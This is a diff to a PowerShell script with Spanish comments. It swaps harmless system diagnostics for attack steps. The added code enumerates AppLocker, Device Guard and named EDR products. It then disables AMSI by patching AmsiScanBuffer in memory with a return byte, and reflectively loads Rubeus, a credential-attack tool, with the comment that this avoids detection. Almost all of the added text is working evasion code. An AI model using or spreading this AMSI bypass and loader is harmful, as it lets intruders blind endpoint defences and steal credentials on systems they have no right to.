@@ -1,22 +1,42 @@
-# Ejecuta estos comandos en Server 2025 y comparte output
+# ¿Hay AppLocker activo?
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
 
-Write-Host "=== DIAGNOSTICO ===" 
-Write-Host "[1] Language Mode:"
-$ExecutionContext.SessionState.LanguageMode
+# ¿Hay Device Guard / HVCI?
+Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object HypervisorPresent
 
-Write-Host "[2] .NET Framework:"
-[System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription
+# ¿Hay algún EDR instalado?
+Get-Service | Where-Object {$_.Name -like "*Sentinel*" -or $_.Name -like "*Crowd*" -or $_.Name -like "*Cortex*" -or $_.Name -like "*MDE*"}
 
-Write-Host "[3] Execution Policy:"
-Get-ExecutionPolicy
+# ¿Puedes leer clr.dll directamente?
+[System.IO.File]::ReadAllBytes("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll").Length
 
-Write-Host "[4] ¿Puedes leer clr.dll?"
-try {
-    $bytes = [System.IO.File]::ReadAllBytes("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll")
-    Write-Host "SI - tamaño: $('{0:N0}' -f $bytes.Length) bytes"
-} catch {
-    Write-Host "NO - Error: $_"
+
+
+
+# AMSI bypass directo (sin tocar archivos de sistema)
+$a = @"
+using System;
+using System.Runtime.InteropServices;
+public class W { 
+    [DllImport("kernel32")] 
+    public static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32")] 
+    public static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")] 
+    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
 }
+"@
+Add-Type $a
+$m = [W]::LoadLibrary("amsi.dll")
+$f = [W]::GetProcAddress($m, "AmsiScanBuffer")
+[uint32]$o = 0
+[W]::VirtualProtect($f, [UIntPtr]1, 0x04, [ref]$o)
+[System.Runtime.InteropServices.Marshal]::WriteByte($f, 0xC3)
+Write-Host "[+] AMSI bypassed"
 
-Write-Host "[5] ¿Eres Admin?"
-([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains [Security.Principal.SecurityIdentifier]"S-1-5-32-544")
+
+
+
+# Ahora carga assemblies sin detección
+$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\Rubeus.exe")
+[System.Reflection.Assembly]::Load($bytes)
